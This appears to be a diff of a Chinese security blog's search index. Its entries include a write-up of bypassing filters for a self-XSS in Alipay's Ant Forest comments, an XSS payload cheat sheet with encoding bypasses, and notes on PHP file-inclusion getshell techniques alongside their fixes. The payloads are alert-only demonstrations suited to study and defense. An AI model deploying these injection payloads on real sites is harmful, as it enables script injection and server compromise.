@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[蚂蚁森林self xss]]></title>
+    <url>%2F2020%2F01%2F14%2F%E8%9A%82%E8%9A%81%E6%A3%AE%E6%9E%97self%20xss%2F</url>
+    <content type="text"><![CDATA[记录一次支付宝的self xss 这两天闲的没(dan)事(teng)，刚好昨晚朋友圈刷了一波蚂蚁森林的self xss，那我也把之前的蚂蚁森林的self xss拿出来玩了一下，发现之前的&lt;script&gt;标签已经被过滤了。 既然&lt;script&gt;被过滤了，脑海中第二反应就是&lt;img&gt;了。 Code1&lt;img/src onerror=alert`哈哈`&gt; 好吧，还真容易，成功弹窗了~其实还有很多姿势可以成功弹窗，比如: Code123456&lt;svg/onload=alert`1`&gt;&lt;img/src onerror=alert`1`&gt;&lt;iframe/onload=alert`1`&gt;&lt;p/oncut=alert`1`&gt;&lt;TAG EVENT=alert`1`&gt;等等... 但是注意这里有字符限制，只允许输入30个字符。 然后昨晚8点多的时候支付宝就已经将改漏洞修复了。出现了熟悉的页面提示。。。 抱着侥幸的心理再尝试一下，一波操作后发现&lt;img&gt;，&lt;iframe&gt;还能用，只不过onerorr被过滤了，那我们就放弃&lt;img&gt;，尝试&lt;iframe&gt;标签。在自己服务器新建了一个页面，插到弹幕中去。x.html Code12345&lt;html&gt;&lt;script&gt;alert(`666`);&lt;/script&gt;&lt;/html&gt; 尝试第一个Payload Code1&lt;iframe src=&quot;http://fsunset.cn/x.html&quot;&gt; 好吧，支付宝间接的提示我太长了。。。 既然这样，让我直接将默认主页设置为x.html这个页面呗，就改一小会，反正我的网站也没人访问。 第二个Payload上场 Code1&lt;iframe src=&quot;http://fsunset.cn&quot;&gt; 嗯，好吧。还是太长了。。。心中一阵绞痛，为什么当初没买几个短一点的域名，当初如果把qq.com，jd.com买下来，今天还搞不定一个self xss??? 恢复理智之后。。。好吧，我TM把http去掉不就行了么。。。 Code1&lt;iframe src=&quot;//fsunset.cn&quot;&gt; 这里第一次尝试的时候没有弹窗。可能是上面的x.html写的有问题。。。好吧，有点牵强 然后我继续尝试第三种Payload Code1&lt;iframe src=&quot;http:fsunset.cn&quot;&gt; 不多不少当好30个字符 插进去试试呗，噢，，，一发入魂，成了 既然成了，杀个程序员祭天呗…改了自己服务器上的x.html页面后再次尝试 Code1&lt;iframe src=&quot;//fsunset.cn&quot;&gt; 发现是可以弹窗的 虽然这个漏洞没有什么技术含量，但是主要是尝试和绕过的限制一个过程。 尝试的过程中，顺便偷了一波能量，所以也导致某些人直接给我送礼]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>支付宝，XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[XSS语句]]></title>
     <url>%2F2020%2F01%2F02%2FXSS%E8%AF%AD%E5%8F%A5%2F</url>
     <content type="text"><![CDATA[标准语句Code123&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 大小写Code1&lt;sCript&gt;alert(1)&lt;/scRipt&gt; 使用img标签windows事件Code123&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&apos;xss&apos;)&quot;)&gt;//图片加载错误时触发 鼠标事件Code1234&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;//鼠标指针移动到元素时触发&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;//鼠标指针移出时触发 使用a标签Code12345&lt;a href=javascript:alert(&apos;xss&apos;)&gt;test&lt;/a&gt;&lt;a href=&quot;javascript:a&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt;&lt;a href=&quot;&quot; onclick=alert(&apos;xss&apos;)&gt;a&lt;/a&gt;&lt;a href=&quot;&quot; onclick=eval(alert(&apos;xss&apos;))&gt;aa&lt;/a&gt;&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&apos;xss&apos;) y=2020&gt;aa&lt;/a&gt; 使用input标签Code123456789101112&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;input value=&quot;&quot; onclick=alert(&apos;xss&apos;) type=&quot;text&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&apos;xss&apos;) bad=&quot;&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;//用户按下按键时触发&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;//用户按下按键时触发&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;//用户松开按键时触发 使用form标签Code12345678&lt;form action=javascript:alert(&apos;xss&apos;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&apos;xss&apos;)&gt;&lt;form method=post action=aa.asp? onmouseover=prompt(&apos;xss&apos;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&apos;xss&apos;)&gt;&lt;form action=1 onmouseover=alert(&apos;xss)&gt;&lt;!--原code--&gt;&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; 使用iframe标签Code123&lt;iframe src=javascript:alert(&apos;xss&apos;)&gt;&lt;/iframe&gt;&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&apos;xss&apos;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; &lt;!--原code--&gt;&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&gt; &lt;!--base64编码--&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; &lt;iframe src=&quot;aaa&quot; onmouseover=alert(&apos;xss&apos;) /&gt;&lt;iframe&gt; &lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt; 使用svg标签Code1&lt;svg onload=alert(1)&gt; 使用body标签Code12&lt;body onload=&quot;alert(1)&quot;&gt;//加载时触发 使用button标签Code12345678910111213141516&lt;button onclick=&quot;alert(1)&quot;&gt;text&lt;/button&gt;//元素上点击鼠标时触发&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//元素上按下鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//在元素上释放鼠标时触发十一、 使用&lt;p&gt;标签&lt;p onmousedown=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//元素上按下鼠标时触发&lt;p onmouseup=&quot;alert(1)&quot;&gt;text&lt;/p&gt;//在元素上释放鼠标时触发 XSS编码绕过html实体编码(10进制与16进制)Code1如把尖括号编码[ &lt; ] -----&gt; html十进制: &amp;#60; html十六进制:&amp;#x3c; javascript的八进制与十六进制Code12345如把尖括号编码[ &lt; ] -----&gt; js八进制:\74 js十六进制:\x3c三个八进制数字，如果数字不够，在前面补零，如a的编码为\141两个十六进制数字，如果数字不够，在前面补零，如a的编码为\x61四个十六进制数字，如果数字不够，在前面补零，如a的编码为\u0061对于一些控制字符，使用特殊的C类型的转义风格，如\n和\r url编码Code1如把尖括号编码[ &lt; ] -----&gt; url: %22 base64编码Code1如把尖括号编码[ &lt; ] -----&gt; base64: Ig== jsunicode编码Code1如把尖括号编码[ &lt; ] -----&gt;jsunicode:\u003c String.fromCharCode编码Code1如alert的编码为String.fromCharCode(97,108,101,114,116)]]></content>
@@ -101,19 +112,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Network-Shell端口转发]]></title>
-    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
-    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>端口转发</tag>
-        <tag>内网渗透</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[文件包含漏洞]]></title>
     <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码Code12345if(isset($_GET[&apos;page&apos;]))&#123; include $_GET[&apos;page&apos;];&#125;else&#123; include &quot;one.php&quot;;&#125; 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
@@ -136,6 +134,19 @@
         <tag>PHP</tag>
         <tag>文件查看</tag>
         <tag>文件下载</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Network-Shell端口转发]]></title>
+    <url>%2F2019%2F08%2F19%2FNetwork-Shell%2F</url>
+    <content type="text"><![CDATA[NetSH(Network Shell)是windows系统本身提供的功能强大的网络配置命令行工具 netsh interface portproxy add v4tov4 – 添加通过 IPv4 的 IPv4 和代理连接到的侦听项目 netsh interface portproxy add v4tov4 [listenport=]|[connectaddress=]|[[connectport=]|][[listenaddress=]|] [[protocol=]tcp] 参数 listenport IPv4 侦听端口 connectaddress IPv4 连接地址 connectport IPv4 连接端口 listenaddress IPv4 侦听地址 protocol 使用的协议。现在只支持 TCP 实例 netsh interface portproxy add v4tov4 listenaddress=192.168.1.8 listenport=14941 connectaddress=192.168.1.118 connectport=1494 在IPV4下将监听本地IP 192.168.1.8:14941,接受到的数据转发给192.168.1.118:1494 netsh interface portproxy delete v4tov4 listenaddress=192.168.1.8 listenport=33891 在IPV4下删除监听本地IP 192.168.1.8:33891 netsh interface portproxy show v4tov4 查看在IPV4下配置的端口转发的策略]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>端口转发</tag>
+        <tag>内网渗透</tag>
+        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -222,15 +233,17 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[子网划分公式]]></title>
-    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
-    <content type="text"><![CDATA[Code12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 Code12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32Code123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
+    <title><![CDATA[PHP-PDO]]></title>
+    <url>%2F2019%2F07%2F10%2FPHP-PDO%2F</url>
+    <content type="text"><![CDATA[开启PDOWindows 修改php.ini配置文件 添加 extension=php_pdo.dll Linux 添加扩展 extension=pdo.so 实例连接Code1234567891011121314151617181920212223242526&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;localhost&apos;; //数据库主机名$dbName=&apos;test&apos;; //使用的数据库$user=&apos;root&apos;; //数据库连接用户名$pass=&apos;&apos;; //对应的密码$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try &#123; $conn = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;; /*你还可以进行一次搜索操作 foreach ($conn-&gt;query(&apos;SELECT * from FOO&apos;) as $row) &#123; print_r($row); //你可以用 echo($GLOBAL); 来看到这些值 &#125; */ $conn = null;&#125; catch (PDOException $e) &#123; die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);&#125;//默认这个不是长连接，如果需要数据库长连接//需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true)//变成这样：$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 查询Code1234567$sql = &quot;SELECT * FROM user WHERE username = ? and password = ?&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$row = $stmt -&gt; fetchAll(); 添加数据Code1234567$sql = &quot;INSERT INTO user(username,password) VALUES(?,?)&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$count &gt; 0 //添加成功]]></content>
       <categories>
-        <category>Network</category>
+        <category>工具</category>
       </categories>
       <tags>
-        <tag>网络</tag>
-        <tag>子网划分</tag>
+        <tag>Mysql</tag>
+        <tag>函数</tag>
+        <tag>PHP</tag>
+        <tag>PDO</tag>
       </tags>
   </entry>
   <entry>
@@ -247,17 +260,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[PHP-PDO]]></title>
-    <url>%2F2019%2F07%2F10%2FPHP-PDO%2F</url>
-    <content type="text"><![CDATA[开启PDOWindows 修改php.ini配置文件 添加 extension=php_pdo.dll Linux 添加扩展 extension=pdo.so 实例连接Code1234567891011121314151617181920212223242526&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;localhost&apos;; //数据库主机名$dbName=&apos;test&apos;; //使用的数据库$user=&apos;root&apos;; //数据库连接用户名$pass=&apos;&apos;; //对应的密码$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try &#123; $conn = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;; /*你还可以进行一次搜索操作 foreach ($conn-&gt;query(&apos;SELECT * from FOO&apos;) as $row) &#123; print_r($row); //你可以用 echo($GLOBAL); 来看到这些值 &#125; */ $conn = null;&#125; catch (PDOException $e) &#123; die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);&#125;//默认这个不是长连接，如果需要数据库长连接//需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true)//变成这样：$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt; 查询Code1234567$sql = &quot;SELECT * FROM user WHERE username = ? and password = ?&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$row = $stmt -&gt; fetchAll(); 添加数据Code1234567$sql = &quot;INSERT INTO user(username,password) VALUES(?,?)&quot;;$stmt = $conn -&gt; prepare($sql);$stmt -&gt; bindParam(1,$username);$stmt -&gt; bindParam(2,$password);$stmt -&gt; execute();$count = $stmt -&gt; rowCount();$count &gt; 0 //添加成功]]></content>
+    <title><![CDATA[子网划分公式]]></title>
+    <url>%2F2019%2F07%2F10%2F%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E5%85%AC%E5%BC%8F%2F</url>
+    <content type="text"><![CDATA[Code12345678910112次方 十进制 二进制2^1=2 128 100000002^2=4 192 110000002^3=8 224 111000002^4=16 240 111100002^5=32 248 111110002^6=64 252 111111002^7=128 254 111111102^8=256 255 111111112^9=512 2^10=1024 子网划分中的3个公式：求可容纳的主机数 2的m次方-2 m表示子网中0的个数（是2进制）；-2表示一个网络地址，一个广播地址。 求可以划分的网段数 2的n次方 n表示“借位”的个数——-&gt;网络位向主机位借的“1”的个数。 求范围 256-X （X表示子网掩码中非255的数） 举例 一个公司有4个部门（市场部、后勤部、财务部、销售部），每个部门有35台主机，要使用192.168.1.0/24来做地址划分4个不同的小网段。如何划分？ 原IP/MASK：192.168.1.0/24 2的n次方要小于等于子网个数 (2^n&gt;=4 n&gt;=2) 新的MASK 255.255.255.192 (11111111.11111111.11111111.11 000000) 256-192=64 Code12345范围：192.168.1.0 —— 192.168.1.63/26192.168.1.64 —— 192.168.1.127/26192.168.1.128 —— 192.168.1.191/26192.168.1.192 —— 192.168.1.255/26 反推网络地址和广播地址 111.243.77.191/11 思路： 现MASK – /11 255.111 00000.0.0 x=224 256-224=32Code123456范围：111.0.0.0 -- 111.31.255.255/11111.32.0.0 -- 111.63.255.255/11........243/32=7.....9111.32*7.0.0 -- 111.32*8-1.255.255/11111.224.0.0 -- 111.255.255.255/11]]></content>
       <categories>
-        <category>工具</category>
+        <category>Network</category>
       </categories>
       <tags>
-        <tag>Mysql</tag>
-        <tag>函数</tag>
-        <tag>PHP</tag>
-        <tag>PDO</tag>
+        <tag>网络</tag>
+        <tag>子网划分</tag>
       </tags>
   </entry>
   <entry>
